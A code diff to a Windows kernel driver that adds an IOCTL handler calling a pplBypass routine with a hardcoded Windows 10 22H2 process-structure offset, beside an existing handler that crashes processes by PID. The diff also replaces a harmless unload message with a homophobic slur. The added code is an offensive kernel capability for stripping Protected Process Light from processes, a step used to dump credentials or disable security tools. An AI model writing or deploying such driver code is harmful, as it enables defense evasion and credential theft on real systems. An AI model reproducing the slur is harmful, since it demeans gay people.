@@ -27,7 +27,7 @@ void UnloadMe(PDRIVER_OBJECT DriverObject) {
     IoDeleteDevice(DriverObject->DeviceObject); // Delete the device object
 
     DbgPrintEx(0, 0, "[%s] Driver has been Unloaded.\n", DRIVER_NAME);
-    DbgPrint("Bye Bye from HelloWorld Driver\n");
+    DbgPrint("Bye Bye fags\n");
 }
 
 
@@ -365,6 +365,20 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
         {
             ULONG_PTR pidVal = *(ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer;
             status = crashProcess(pidVal);
+            break;
+		}
+        case IOCTL_PPL_BYPASS:
+        {
+            DWORD pidVal = *(DWORD*)Irp->AssociatedIrp.SystemBuffer;
+            //int offset = *(int*)((ULONG_PTR*)Irp->AssociatedIrp.SystemBuffer + 1);
+			int offset = 0x5fa; // Windows 10 22H2 x64 offset
+            status = pplBypass(pidVal, offset);
+            if (!NT_SUCCESS(status)) {
+                DbgPrintEx(0, 0, "[%s] Failed to bypass PPL for PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
+            }
+            else {
+                DbgPrintEx(0, 0, "[%s] Successfully bypassed PPL for PID %lu\n", DRIVER_NAME, (unsigned long)pidVal);
+			}
             break;
 		}
         default:
